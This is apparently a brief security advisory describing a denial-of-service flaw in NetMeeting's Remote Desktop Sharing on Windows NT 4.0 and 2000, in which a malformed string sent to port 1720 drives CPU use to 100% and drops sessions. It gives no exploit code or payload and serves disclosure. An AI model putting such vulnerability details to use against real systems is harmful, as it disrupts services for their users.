The Remote Desktop Sharing component of Microsoft NetMeeting for Windows NT 4.0 / 2000 does not properly handle a particular type of malformed input string sent over port 1720. CPU utilization can be caused to spike to 100% and any existing NetMeeting sessions would fail in the event of an attack. Restarting the application would be required in order to regain normal functionality.

NetMeeting, including the affected component Remote Desktop Sharing, is shipped with Microsoft 2000 but is not enabled by default. NetMeeting can be downloaded as an add-on for NT 4.0.
